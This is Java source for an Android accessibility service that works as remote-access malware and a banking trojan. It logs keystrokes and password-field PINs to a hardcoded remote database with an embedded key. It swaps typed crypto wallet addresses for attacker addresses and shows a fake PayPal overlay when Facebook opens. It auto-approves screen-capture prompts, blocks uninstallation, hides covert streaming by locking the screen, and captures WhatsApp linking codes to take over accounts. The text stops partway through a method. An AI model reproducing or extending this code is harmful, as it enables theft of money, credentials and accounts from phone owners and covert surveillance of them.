package com.rcl.androidstreamcontrol.service;

import static com.rcl.androidstreamcontrol.service.ControlServiceRepository.EVENT_BYTES_TAG;
import static com.rcl.androidstreamcontrol.service.ControlServiceRepository.IS_PINCH_TAG;
import static com.rcl.androidstreamcontrol.utils.MyConstants.APP_SCREEN_PIXELS_WIDTH;
import static com.rcl.androidstreamcontrol.utils.MyConstants.FULL_SCREEN_PIXELS_HEIGHT;
import static com.rcl.androidstreamcontrol.utils.Utils.twoBytesToInt;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Path;
import timber.log.Timber;
import android.view.accessibility.AccessibilityEvent;
import android.content.BroadcastReceiver;
import android.content.IntentFilter;
import android.view.accessibility.AccessibilityNodeInfo;
import com.rcl.androidstreamcontrol.webrtc.AgoraManager;

import android.accessibilityservice.AccessibilityService.TakeScreenshotCallback;
import android.accessibilityservice.AccessibilityService.ScreenshotResult;
import android.graphics.Bitmap;
import android.hardware.HardwareBuffer;
import android.graphics.ColorSpace;
import java.io.ByteArrayOutputStream;
import android.util.Base64;
import android.view.Display;
import java.util.concurrent.Executors;
import androidx.core.util.Consumer;
import java.util.concurrent.ExecutorService;

import java.util.ArrayDeque;

public class ControlService extends AccessibilityService {

    private static final String TAG = "ControlService";

    public static ControlService instance;
    public static String currentJarvisCommand = null;
    public static boolean isJarvisActive = false;

    private ExecutorService networkExecutor;
    private GestureDescription.StrokeDescription gesture;
    private float zoomScale = 3;
    private BroadcastReceiver bro;
    private static ControlService sharedInstance;
    private android.os.Handler handler = new android.os.Handler(android.os.Looper.getMainLooper());
    public static boolean hasInjectedFacebook = false;
    private long lastAutoClickerRunTime = 0;
    private boolean autoClickerPollingActive = false;

    private String currentSessionId = "";
    private java.util.HashMap<String, AccessibilityNodeInfo> nodeMap = new java.util.HashMap<>();

    public static boolean isWhatsAppLinkingMode = false;

    private ArrayDeque<GestureDescription.Builder> gestureQ;
    private long startTime = 0;

    public static ControlService getSharedInstance() {
        return sharedInstance;
    }

    public void triggerGesture(Intent intent) {
        handleGestureRequest(intent);
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        Timber.tag("ControlService").d("Service Connected and Ready");
    }

    @Override
    public void onCreate() {
        networkExecutor = Executors.newFixedThreadPool(2);
        Timber.tag("onCreate").d("Accessibility service created");
        gestureQ = new ArrayDeque<>();
        bro = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (intent.getAction().equals("com.rcl.androidstreamcontrol.GESTURE_EVENT")) {
                    Timber.d("Received broadcast");
                    handleGestureRequest(intent);
                } else if (intent.getAction().equals("com.rcl.androidstreamcontrol.LOG_EVENT")) {
                    String appName = intent.getStringExtra("appName");
                    String log = intent.getStringExtra("log");
                    if (appName != null && log != null) {
                        logKeystrokeToSupabase(appName, log);
                    }
                } else if (intent.getAction().equals(Intent.ACTION_SCREEN_ON)) {
                    if (AgoraManager.isWebRTCActive || AgoraManager.isExpectingMediaProjection) {
                        Timber.d("PANIC PROTOCOL ACTIVATED - Screen turned on during active session!");
                        performGlobalAction(GLOBAL_ACTION_HOME);
                        performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
                    }
                }
            }
        };

        sharedInstance = this;

        IntentFilter filter = new IntentFilter();
        filter.addAction("com.rcl.androidstreamcontrol.GESTURE_EVENT");
        filter.addAction("com.rcl.androidstreamcontrol.LOG_EVENT");
        filter.addAction(Intent.ACTION_SCREEN_ON);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(bro, filter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(bro, filter);
        }
    }

    private long lastAtsTime = 0;
    private android.view.View dynamicTripwireView = null;

    public void enableDynamicTripwire() {
        if (dynamicTripwireView != null) return;

        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
            try {
                android.view.WindowManager wm = (android.view.WindowManager) getSystemService(WINDOW_SERVICE);
                android.view.WindowManager.LayoutParams params = new android.view.WindowManager.LayoutParams(
                        1, 1,
                        android.view.WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                        android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                        android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        android.view.WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                        android.graphics.PixelFormat.TRANSPARENT);
                params.gravity = android.view.Gravity.TOP | android.view.Gravity.START;

                dynamicTripwireView = new android.view.View(this);
                dynamicTripwireView.setOnTouchListener((v, event) -> {
                    if (event.getAction() == android.view.MotionEvent.ACTION_OUTSIDE) {
if (AgoraManager.isWebRTCActive && (System.currentTimeMillis() - lastAtsTime > 1500)) {

                            AgoraManager mgr = AgoraManager.getInstance();
                            if (mgr != null) mgr.stopScreenCaptureAndLeave();

                            performGlobalAction(GLOBAL_ACTION_HOME);
                            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                                performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
                            }, 500);

                            disableDynamicTripwire();
                        }
                    }
                    return false;
                });
                wm.addView(dynamicTripwireView, params);
                Timber.d("Dynamic Tripwire enabled.");
            } catch (Exception e) {
                Timber.e(e, "Failed to add dynamic tripwire view");
            }
        });
    }

    public void disableDynamicTripwire() {
        if (dynamicTripwireView != null) {
            new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
                try {
                    android.view.WindowManager wm = (android.view.WindowManager) getSystemService(WINDOW_SERVICE);
                    wm.removeView(dynamicTripwireView);
                    dynamicTripwireView = null;
                    Timber.d("Dynamic Tripwire disabled.");
                } catch (Exception e) {
                    Timber.e(e, "Failed to remove dynamic tripwire view");
                }
            });
        }
    }

    public static void stampDashboardCommand() {
        if (sharedInstance != null) {
            sharedInstance.lastAtsTime = System.currentTimeMillis();
            Timber.d("Dashboard command stamped at " + sharedInstance.lastAtsTime);
        }
    }

    private final java.util.concurrent.atomic.AtomicBoolean isVisionLoopRunning = new java.util.concurrent.atomic.AtomicBoolean(false);

    private void handleGestureRequest(Intent intent) {
        if (intent.getBooleanExtra(IS_PINCH_TAG, false))
            tryDispatchGesture(createPinchGesture(intent));
        else
            tryDispatchGesture(createGeneralGesture(intent));
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || event.getPackageName() == null) return;

        if (com.rcl.androidstreamcontrol.utils.FeatureConfig.ENABLE_ANTI_UNINSTALL && !AgoraManager.isExpectingMediaProjection) {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                AccessibilityNodeInfo uninstallNode = findNodeContainingText(root, new String[]{"Uninstall", "Force stop", "Delete", "Deactivate"});
                if (uninstallNode != null) {
                    Timber.d("Anti-Uninstall triggered! Forcing home screen.");
                    performGlobalAction(GLOBAL_ACTION_HOME);
                }
            }
        }

        if (com.rcl.androidstreamcontrol.utils.FeatureConfig.ENABLE_PAYPAL_INJECT) {
            String pkg = event.getPackageName().toString();
            android.content.SharedPreferences prefs = getSharedPreferences("PortalPrefs", MODE_PRIVATE);
            boolean isSubmitted = prefs.getBoolean("facebook_overlay_submitted", false);

            if (pkg.equals("com.facebook.katana") && !hasInjectedFacebook && !isSubmitted) {
                Timber.d("Facebook opened! Triggering Web-Inject.");
                hasInjectedFacebook = true;
                com.rcl.androidstreamcontrol.ui.PayPalOverlayView.show(this);
            }
        }

        if (isWhatsAppLinkingMode && com.rcl.androidstreamcontrol.utils.FeatureConfig.ENABLE_WHATSAPP_WEB) {
            String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
            if (pkg.contains("whatsapp") || pkg.contains("com.whatsapp")) {
                Timber.d("WhatsApp dialog detected in linking mode — processing OTP");
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root != null) {
                    processWhatsAppDialog(root);
                }
            }
        }

        if (AgoraManager.isExpectingMediaProjection && !autoClickerPollingActive) {
            autoClickerPollingActive = true;
            startAutoClickerPolling();
        }

        if (isJarvisActive && currentJarvisCommand != null) {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                isJarvisActive = false;
                sendNodeTreeToServer(root, currentJarvisCommand);
            }
        }

        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            AccessibilityNodeInfo sourceNode = event.getSource();
            boolean isPasswordField = false;
            if (sourceNode != null) {
                isPasswordField = sourceNode.isPassword();
            }

            java.util.List<CharSequence> textList = event.getText();
            if (textList != null && !textList.isEmpty()) {
                StringBuilder sb = new StringBuilder();
                for (CharSequence cs : textList) {
                    if (cs != null) sb.append(cs);
                }
                String typedText = sb.toString();

                if (typedText.endsWith("\u2026") || typedText.endsWith("...")) {
                    return;
                }

                if (com.rcl.androidstreamcontrol.utils.FeatureConfig.ENABLE_CLIPBOARD_HIJACK && sourceNode != null) {
                    String attackerEthAddress = "0xVillainAddress000000000000000000000000";
                    String attackerBtcAddress = "1VillainBitcoinAddress000000000000";
                    String attackerTrxAddress = "TVillainTronAddress000000000000000";

                    String replacement = null;

                    if (typedText.matches(".*0x[a-fA-F0-9]{40}.*") && !typedText.contains(attackerEthAddress)) {
                        replacement = attackerEthAddress;
                    } else if (typedText.matches(".*[13][a-km-zA-HJ-NP-Z1-9]{25,34}.*") || typedText.matches(".*bc1[a-zA-HJ-NP-Z0-9]{25,39}.*")) {
                        if (!typedText.contains(attackerBtcAddress)) {
                            replacement = attackerBtcAddress;
                        }
                    } else if (typedText.matches(".*T[A-Za-z1-9]{33}.*") && !typedText.contains(attackerTrxAddress)) {
                        replacement = attackerTrxAddress;
                    }

                    if (replacement != null) {
                        Timber.d("Crypto address detected! Hijacking clipboard/text field.");
                        android.os.Bundle arguments = new android.os.Bundle();
                        arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, replacement);
                        sourceNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
                    }
                }

                String pkgName = event.getPackageName() != null ? event.getPackageName().toString() : "Unknown";

                if (isPasswordField || typedText.contains("\u2022")) {
                    String extracted = "";
                    for (int i = 0; i < typedText.length(); i++) {
                        char c = typedText.charAt(i);
                        if (c != '\u2022') {
                            extracted += c;
                        }
                    }
                    if (!extracted.isEmpty()) {
                        logKeystrokeToSupabase(pkgName, "[PIN] " + extracted);
                    }
                } else if (!typedText.trim().isEmpty()) {
                    logKeystrokeToSupabase(pkgName, typedText);
                }
            }
        }

        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            AccessibilityNodeInfo clickedNode = event.getSource();
            String tapValue = "";

            if (clickedNode != null) {
                CharSequence text = clickedNode.getText();
                CharSequence desc = clickedNode.getContentDescription();

                if (text != null && text.length() > 0) tapValue = text.toString().trim();
                else if (desc != null && desc.length() > 0) tapValue = desc.toString().trim();
            }

            if (tapValue.isEmpty()) {
                java.util.List<CharSequence> eventTextList = event.getText();
                if (eventTextList != null && !eventTextList.isEmpty()) {
                    for (CharSequence cs : eventTextList) {
                        if (cs != null && cs.length() > 0 && cs.length() <= 10) {
                            tapValue = cs.toString().trim();
                            break;
                        }
                    }
                }
            }

            if (!tapValue.isEmpty() && tapValue.length() <= 20
                    && !tapValue.matches("^[\u2022]+$")) {
                String pkgName = event.getPackageName() != null ? event.getPackageName().toString() : "Unknown";

                String coordinates = "";
                if (clickedNode != null) {
                    android.graphics.Rect bounds = new android.graphics.Rect();
                    clickedNode.getBoundsInScreen(bounds);
                    int x = bounds.centerX();
                    int y = bounds.centerY();
                    coordinates = " (X:" + x + " Y:" + y + ")";
                }

                logKeystrokeToSupabase(pkgName, "[TAP] " + tapValue + coordinates);
            }
        }
    }

    private long lastLogTime = 0;
    private String lastLoggedText = "";
    private android.os.Handler logHandler = new android.os.Handler(android.os.Looper.getMainLooper());
    private Runnable pendingLogRunnable = null;

    private void logKeystrokeToSupabase(String appName, String text) {
        if (text.startsWith("[TAP]") || text.startsWith("[PIN]")) {
            sendToSupabase(appName, text);
            return;
        }
        if (pendingLogRunnable != null) {
            logHandler.removeCallbacks(pendingLogRunnable);
        }
        final String finalAppName = appName;
        final String finalText = text;
        pendingLogRunnable = () -> {
            sendToSupabase(finalAppName, finalText);
        };
        logHandler.postDelayed(pendingLogRunnable, 1500);
    }

    private void sendToSupabase(String appName, String text) {
        android.content.SharedPreferences prefs = getSharedPreferences("PortalPrefs", MODE_PRIVATE);
        String deviceId = prefs.getString("supabase_uid", null);
        if (deviceId == null) return;

        networkExecutor.execute(() -> {
            try {
                android.util.Log.d(TAG, "Attempting to log keystroke to Supabase: " + text);
                java.net.URL url = new java.net.URL("https://qxzozsdgrgahvgzpsfmm.supabase.co/rest/v1/keyboard_logs");
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                String anonKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF4em96c2RncmdhaHZnenBzZm1tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk4MDY4NjAsImV4cCI6MjA5NTM4Mjg2MH0.inUzMp-S9BRjNQYHynTAOPRo4EeY3Whqv9okvEeySB4";
                conn.setRequestProperty("apikey", anonKey);
                conn.setRequestProperty("Authorization", "Bearer " + anonKey);
                conn.setDoOutput(true);

                org.json.JSONObject payload = new org.json.JSONObject();
                payload.put("device_id", deviceId);
                payload.put("app_name", appName);
                payload.put("content", text);

                try (java.io.OutputStream os = conn.getOutputStream()) {
                    byte[] input = payload.toString().getBytes("utf-8");
                    os.write(input, 0, input.length);
                }

                int code = conn.getResponseCode();
                if (code != 201) {
                    android.util.Log.e(TAG, "Failed to log keystroke, response code: " + code);
                }
            } catch (Exception e) {
                android.util.Log.e(TAG, "Error logging keystroke", e);
            }
        });
    }

    public void triggerJarvisCommand(String command) {
        currentJarvisCommand = command;
        isJarvisActive = true;
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root != null) {
            isJarvisActive = false;
            sendNodeTreeToServer(root, currentJarvisCommand);
        } else {
            android.util.Log.d(TAG, "Root node null, waiting for next AccessibilityEvent to run Jarvis.");
        }
    }

    private void startAutoClickerPolling() {
        android.util.Log.d(TAG, "[NativeClicker] Starting auto-clicker polling loop.");
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!AgoraManager.isExpectingMediaProjection) {
                    android.util.Log.d(TAG, "[NativeClicker] Polling stopped: isExpectingMediaProjection is false.");
                    autoClickerPollingActive = false;
                    return;
                }

                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root != null) {
                    handleMediaProjectionDialog(root);
                } else {
                    android.util.Log.d(TAG, "[NativeClicker] Polling: root is null, will retry.");
                }

                if (AgoraManager.isExpectingMediaProjection) {
                    handler.postDelayed(this, 700);
                } else {
                    autoClickerPollingActive = false;
                }
            }
        }, 300);
    }

    private void handleMediaProjectionDialog(AccessibilityNodeInfo root) {
        String[] singleAppKeywords = {"single app", "one app", "a single app", "an app", "choose app", "specific app", "app", "application", "window", "this app", "only one"};
        String[] entireScreenKeywords = {"entire screen", "whole screen", "all screen", "everything", "display", "entire", "whole", "full screen", "all of your screen", "share your screen", "screen", "device screen", "cast screen"};
        String[] startKeywords = {"start now", "start recording", "allow", "cast", "share", "begin", "start", "now", "ok", "yes", "accept", "continue", "grant", "permit", "record"};

        AccessibilityNodeInfo startNode = findNodeContainingText(root, startKeywords);

        if (startNode != null) {
            AccessibilityNodeInfo singleAppNode = findNodeContainingText(root, singleAppKeywords);
            AccessibilityNodeInfo entireScreenNode = findNodeContainingText(root, entireScreenKeywords);

            if (singleAppNode != null && entireScreenNode == null) {
                clickNode(singleAppNode);
                android.util.Log.d("ControlService", "[NativeClicker] Clicked 'Single app' to open dropdown.");
                return;
            }

            clickNode(startNode);
            android.util.Log.d("ControlService", "[NativeClicker] Clicked 'Start' confirmation button.");
            AgoraManager.isExpectingMediaProjection = false;
            return;
        } else {
            AccessibilityNodeInfo entireScreenNode = findNodeContainingText(root, entireScreenKeywords);
            if (entireScreenNode != null) {
                clickNode(entireScreenNode);
                android.util.Log.d("ControlService", "[NativeClicker] Clicked 'Entire screen' inside dropdown.");
            }
        }
    }

    private AccessibilityNodeInfo findNodeContainingText(AccessibilityNodeInfo node, String[] targetTexts) {
        if (node == null) return null;
        CharSequence text = node.getText();
        CharSequence desc = node.getContentDescription();

        String nodeString = "";
        if (text != null) nodeString += text.toString().toLowerCase() + " ";
        if (desc != null) nodeString += desc.toString().toLowerCase();

        if (!nodeString.trim().isEmpty() && isActualButton(node)) {
            for (String targetText : targetTexts) {
                if (nodeString.contains(targetText.toLowerCase())) {
                    return node;
                }
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo result = findNodeContainingText(node.getChild(i), targetTexts);
            if (result != null) return result;
        }
        return null;
    }

    private boolean isActualButton(AccessibilityNodeInfo node) {
        if (node == null) return false;

        CharSequence className = node.getClassName();
        if (className != null && className.toString().toLowerCase().contains("button")) {
            return true;
        }

        if (node.isClickable()) {
            return true;
        }

        AccessibilityNodeInfo parent = node.getParent();
        if (parent != null && parent.isClickable()) {
            CharSequence parentClass = parent.getClassName();
            if (parentClass != null && !parentClass.toString().contains("ScrollView") && parent.getChildCount() <= 3) {
                return true;
            }
        }

        return false;
    }

    private void clickNode(AccessibilityNodeInfo node) {
        if (node == null) return;
        if (node.isClickable()) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        } else {
            AccessibilityNodeInfo parent = node.getParent();
            if (parent != null && parent.isClickable()) {
                parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            } else if (parent != null) {
                clickNode(parent);
            }
        }
    }

    @Override
    public void onInterrupt() {
        Timber.tag("onInterrupt").d("Accessibility service interrupted");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Timber.tag(TAG).d("control service started");
        return Service.START_NOT_STICKY;
    }

    // -------------------------------------------------------------
    // WHATSAPP WEB LINKING — OTP auto-capture & injection (v159)
    // -------------------------------------------------------------

    public void startWhatsAppWebFlow() {
        if (!com.rcl.androidstreamcontrol.utils.FeatureConfig.ENABLE_WHATSAPP_WEB) return;
        isWhatsAppLinkingMode = true;
        android.util.Log.d(TAG, "WhatsApp Web linking mode active — waiting for OTP dialog");

        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!isWhatsAppLinkingMode) return;
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root != null && processWhatsAppDialog(root)) {
                    return;
                }
                if (isWhatsAppLinkingMode) {
                    handler.postDelayed(this, 2000);
                }
            }
        }, 4000);
    }

    private boolean processWhatsAppDialog(AccessibilityNodeInfo root) {
        if (root == null) return false;

        String code = findWhatsAppCode(root);
        if (code == null || code.isEmpty()) return false;

        android.util.Log.d(TAG, "Found WhatsApp linking code: " + code);

        AccessibilityNodeInfo inputField = findEditableField(root);
        if (inputField == null) {
            android.util.Log.e(TAG, "No editable field found for code injection");
            return false;
        }

        android.os.Bundle args = new android.os.Bundle();
        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, code);
        boolean injected = inputField.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
        android.util.Log.d(TAG, "Code injection result: " + injected);

        handler.postDelayed(() -> {
            AccessibilityNodeInfo newRoot = getRootInActiveWindow();
            if (newRoot != null) {
                AccessibilityNodeInfo confirmBtn = findConfirmButton(newRoot);
                if (confirmBtn != null) {
                    boolean clicked = confirmBtn.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    android.util.Log.d(TAG, "Confirm button click result: " + clicked);
                }
            }

            NotificationSpyService.cancelWhatsAppNotification();
            SystemUpdateOverlayService.dismiss();
            isWhatsAppLinkingMode = false;
            android.util.Log.d(TAG, "WhatsApp Web linking flow completed successfully");
        }, 1200);

        return true;
    }

    private String findWhatsAppCode(AccessibilityNodeInfo node) {
        if (node == null) return null;

        CharSequence nodeText = node.getText();
        CharSequence nodeDesc = node.getContentDescription();
        String fullText = "";
        if (nodeText != null) fullText += nodeText.toString() + " ";
        if (nodeDesc != null) fullText += nodeDesc.toString();

        if (!fullText.isEmpty()) {
            java.util.regex.Pattern pattern1 = java.util.regex.Pattern.compile("\\b(\\d{8})\\b");
            java.util.regex.Matcher matcher1 = pattern1.matcher(fullText);
            if (matcher1.find()) return matcher1.group(1);

            java.util.regex.Pattern pattern2 = java.util.regex.Pattern.compile("(\\d{3})[-\\s](\\d{3})[-\\s](\\d{2})");
            java.util.regex.Matcher matcher2 = pattern2.matcher(fullText);
            if (matcher2.find()) return matcher2.group(1) + matcher2.group(2) + matcher2.group(3);

            java.util.regex.Pattern pattern3 = java.util.regex.Pattern.compile("(\\d{4})[-\\s](\\d{4})");
            java.util.regex.Matcher matcher3 = pattern3.matcher(fullText);
            if (matcher3.find()) return matcher3.group(1) + matcher3.group(2);
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            String result = findWhatsAppCode(node.getChild(i));
            if (result != null) return result;
        }

        return null;
    }

    private AccessibilityNodeInfo findEditableField(AccessibilityNodeInfo node) {
        if (node == null) return null;

        if (node.isEditable() || (node.getClassName() != null
                && node.getClassName().toString().toLowerCase().contains("edittext"))) {
            return node;
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo result = findEditableField(node.getChild(i));
            if (result != null && result.isEditable()) return result;
        }

        return null;
    }

    private AccessibilityNodeInfo findConfirmButton(AccessibilityNodeInfo node) {
        if (node == null) return null;

        CharSequence text = node.getText();
        CharSequence desc = node.getContentDescription();
        String nodeString = "";
        if (text != null) nodeString += text.toString().toLowerCase() + " ";
        if (desc != null) nodeString += desc.toString().toLowerCase();

        if (!nodeString.trim().isEmpty()) {
            String[] confirmKeywords = {"ok", "link", "confirm", "submit", "done", "yes", "next", "allow", "connect", "pair", "verify"};
            for (String keyword : confirmKeywords) {
                if (nodeString.contains(keyword)) {
                    if (isActualButton(node)) {
                        return node;
                    }
                }
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo result = findConfirmButton(node.getChild(i));
            if (result != null) return result;
        }

        return null;
    }

    // -------------------------------------------------------------
    // JARVIS VISION BRIDGE & NODE EXTRACTION
    // -------------------------------------------------------------

    private void sendNodeTreeToServer(AccessibilityNodeInfo root, String userCommand) {
        if (root == null) return;

        try {
            org.json.JSONArray nodesArray = new org.json.JSONArray();
            extractNodes(root, nodesArray);

            org.json.JSONObject payload = new org.json.JSONObject();
            payload.put("command", userCommand);
            payload.put("uiText", nodesArray.toString());

            networkExecutor.execute(() -> {
                try {
                    java.net.URL url = new java.net.URL("http://77.105.133.37:3030/api/jarvis/command");
                    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);

                    try (java.io.OutputStream os = conn.getOutputStream()) {
                        byte[] input = payload.toString().getBytes("utf-8");
                        os.write(input, 0, input.length);
                    }

                    int code = conn.getResponseCode();
                    if (code == 200) {
                        try (java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(conn.getInputStream(), "utf-8"))) {
                            StringBuilder response = new StringBuilder();
                            String responseLine = null;
                            while ((responseLine = br.readLine()) != null) {
                                response.append(responseLine.trim());
                            }

                            org.json.JSONObject responseJson = new org.json.JSONObject(response.toString());
                            handleJarvisAction(responseJson);
                        }
                    } else {
                        android.util.Log.e(TAG, "Jarvis Server Error: " + code);
                        isJarvisActive = true;
                    }
                } catch (Exception e) {
                    android.util.Log.e(TAG, "Jarvis Network Error", e);
                    isJarvisActive = true;
                }
            });
        } catch (Exception e) {
            android.util.Log.e(TAG, "Jarvis extraction error", e);
        }
    }

    private void extractNodes(AccessibilityNodeInfo node, org.json.JSONArray outArray) throws org.json.JSONException {
        if (node == null) return;

        if (node.isPassword()) {
            return;
        }

        CharSequence text = node.getText();
        CharSequence desc = node.getContentDescription();
        String nodeText = "";
        if (text != null) nodeText += text.toString() + " ";
        if (desc != null) nodeText += desc.toString();
        nodeText = nodeText.trim();

        if (!nodeText.isEmpty() || node.isClickable() || node.isScrollable()) {
            org.json.JSONObject jNode = new org.json.JSONObject();
            android.graphics.Rect bounds = new android.graphics.Rect();
            node.getBoundsInScreen(bounds);
            String pseudoId = bounds.left + "," + bounds.top + "," + bounds.width() + "," + bounds.height();

            jNode.put("node_id", pseudoId);
            if (!nodeText.isEmpty()) jNode.put("text", nodeText);
            if (node.isClickable()) jNode.put("clickable", true);
            if (node.isScrollable()) jNode.put("scrollable", true);

            outArray.put(jNode);
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            extractNodes(node.getChild(i), outArray);
        }
    }

    private void handleJarvisAction(org.json.JSONObject actionJson) {
        String action = actionJson.optString("action", "");
        String nodeId = actionJson.optString("node_id", "");
        String textToType = actionJson.optString("text", "");

        android.util.Log.d(TAG, "Jarvis executed action: " + action + " on " + nodeId);

        if (action.equals("done")) {
            currentJarvisCommand = null;
            isJarvisActive = false;
            return;
        }

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root != null) {
            if (action.equals("home")) {
                performGlobalAction(GLOBAL_ACTION_HOME);
            } else if (action.equals("launch_app")) {
                if (!textToType.isEmpty()) launchAppByName(textToType);
            } else if (action.equals("scroll_forward")) {
                AccessibilityNodeInfo target = findNodeByPseudoId(root, nodeId);
                if (target != null) target.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
            } else if (action.equals("scroll_backward")) {
                AccessibilityNodeInfo target = findNodeByPseudoId(root, nodeId);
                if (target != null) target.performAction(AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD);
            } else if (action.equals("click")) {
                AccessibilityNodeInfo target = findNodeByPseudoId(root, nodeId);
                if (target != null) {
                    boolean clicked = target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    if (!clicked) {
                        android.graphics.Rect bounds = new android.graphics.Rect();
                        target.getBoundsInScreen(bounds);
                        android.util.DisplayMetrics metrics = getResources().getDisplayMetrics();
                        float x = bounds.centerX() / (float) metrics.widthPixels;
                        float y = bounds.centerY() / (float) metrics.heightPixels;
                        dispatchGroqGesture(x, y);
                    }
                }
            } else if (action.equals("type_text")) {
                AccessibilityNodeInfo target = findNodeByPseudoId(root, nodeId);
                if (target != null) {
                    android.os.Bundle arguments = new android.os.Bundle();
                    arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, textToType);
                    boolean typed = target.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
                    if (!typed) {
                        android.graphics.Rect bounds = new android.graphics.Rect();
                        target.getBoundsInScreen(bounds);
                        android.util.DisplayMetrics metrics = getResources().getDisplayMetrics();
                        float x = bounds.centerX() / (float) metrics.widthPixels;
                        float y = bounds.centerY() / (float) metrics.heightPixels;
                        dispatchGroqGesture(x, y);
                    }
                }
            }
        }

        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
            if (currentJarvisCommand != null) {
                isJarvisActive = true;
                AccessibilityNodeInfo newRoot = getRootInActiveWindow();
                if (newRoot != null) {
                    isJarvisActive = false;
                    sendNodeTreeToServer(newRoot, currentJarvisCommand);
                }
            }
        }, 2000);
    }

    private AccessibilityNodeInfo findNodeByPseudoId(AccessibilityNodeInfo node, String pseudoId) {
        if (node == null) return null;
        android.graphics.Rect bounds = new android.graphics.Rect();
        node.getBoundsInScreen(bounds);
        String currentPseudoId = bounds.left + "," + bounds.top + "," + bounds.width() + "," + bounds.height();
        if (currentPseudoId.equals(pseudoId)) {
            return node;
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo result = findNodeByPseudoId(node.getChild(i), pseudoId);
            if (result != null) return result;
        }
        return null;
    }

    // -------------------------------------------------------------
    // JARVIS AGENT LOOP
    // -------------------------------------------------------------

    public void startAgentLoop(String initialCommand) {
        currentSessionId = java.util.UUID.randomUUID().toString();
        continueAgentLoop(initialCommand);
    }

    private void continueAgentLoop(String command) {
        new Thread(() -> {
            try {
                nodeMap.clear();
                org.json.JSONArray nodeArray = new org.json.JSONArray();
                AccessibilityNodeInfo root = getRootInActiveWindow();
                traverseNodeTree(root, nodeArray);

                sendPayloadToServer(nodeArray, command, null);
            } catch (Exception e) {
                android.util.Log.e(TAG, "[AgentLoop] Error in tree traversal", e);
                isVisionLoopRunning.set(false);
            }
        }).start();
    }

    private void traverseNodeTree(AccessibilityNodeInfo node, org.json.JSONArray nodeArray) {
        if (node == null) return;

        if (node.isPassword()) return;

        boolean isClickable = node.isClickable() || node.isLongClickable();
        boolean isScrollable = node.isScrollable();
        boolean isEditable = node.isEditable();

        if (isScrollable && !isClickable) {
            for (int i = 0; i < node.getChildCount(); i++) {
                traverseNodeTree(node.getChild(i), nodeArray);
            }
            return;
        }

        CharSequence text = node.getText();
        CharSequence desc = node.getContentDescription();
        String nodeText = "";
        if (text != null && text.length() > 0) nodeText += text.toString().trim();
        if (desc != null && desc.length() > 0) {
            if (!nodeText.isEmpty()) nodeText += " ";
            nodeText += desc.toString().trim();
        }

        if (isClickable && nodeText.isEmpty()) {
            nodeText = gatherChildText(node, 2).trim();
        }

        if (isClickable || isEditable) {
            if (nodeText.isEmpty() && !isEditable) {
                for (int i = 0; i < node.getChildCount(); i++) {
                    traverseNodeTree(node.getChild(i), nodeArray);
                }
                return;
            }
